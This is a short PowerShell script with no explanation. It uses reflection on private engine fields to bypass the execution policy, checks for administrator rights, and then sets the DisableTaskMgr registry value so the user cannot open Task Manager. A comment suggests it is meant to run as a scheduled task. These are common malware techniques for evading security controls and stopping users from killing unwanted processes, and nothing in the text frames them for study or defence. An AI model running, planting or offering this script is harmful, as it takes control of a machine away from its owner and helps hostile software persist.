# running with task

function Disable-ExecutionPolicy {
    ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
};

Disable-ExecutionPolicy;

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    exit
}

$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"

if (-not (Test-Path $RegPath)) {
    New-Item -Path $RegPath -Force | Out-Null
}

Set-ItemProperty -Path $RegPath -Name "DisableTaskMgr" -Value 1
